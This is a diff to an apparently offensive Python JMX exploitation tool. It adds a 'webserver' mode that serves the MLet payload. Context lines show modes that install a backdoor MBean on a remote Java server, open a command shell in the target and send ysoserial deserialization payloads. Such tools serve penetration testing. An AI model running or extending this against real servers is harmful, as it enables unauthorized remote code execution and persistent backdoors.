@@ -70,15 +70,22 @@ def connectToJMX(args):
         sys.exit(-1)
 ##########
 
+### WEBSERVER MODE ###
+def webserverMode(args):
+    startWebserver(args)
+    raw_input("[+] Press Enter to stop the service\n")
+
+### /WEBSERVER MODE ###
+
 ### INSTALL MODE ###
 
 def installMode(args):
     startWebserver(args)
     bean_server = connectToJMX(args)
-    installMBeans(args, bean_server)
+    installMBean(args, bean_server)
     print "[+] Done"
 
-def installMBeans(args, bean_server):
+def installMBean(args, bean_server):
     # Installation, load javax.management.loading.MLet to install additional MBeans
     # If loading fails, the Mlet is already loaded...
     try:
@@ -220,8 +227,6 @@ def changePassword(password, newpass, bean_server):
     else:
         print "[-] Unable to change password"
 
-
-    sys.stdout.write("\n")
     sys.stdout.flush()
 
 ### /CHANGE PASSWORD MODE ###
@@ -372,6 +377,8 @@ def arg_password_mode(args):
     changePasswordMode(args)
 def arg_uninstall_mode(args):
     uninstallMode(args)
+def arg_webserver_mode(args):
+    webserverMode(args)
 def arg_deserialization_mode(args):
     deserializationMode(args)
 
@@ -420,6 +427,13 @@ script_subparser.set_defaults(func=arg_script_mode)
 shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
 shell_subparser.add_argument('password', help="the required password to access the installed MBean")
 shell_subparser.set_defaults(func=arg_shell_mode)
+
+# Webserver mode
+webserver_subparser = subparsers.add_parser('webserver', help='just run the MLET web server')
+webserver_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
+webserver_subparser.add_argument('payload_port', help='port to load the system')
+webserver_subparser.set_defaults(func=arg_webserver_mode)
+
 
 # Deserialization mode
 deserialize_subparser = subparsers.add_parser('deserialize', help='send a ysoserial payload to the target')
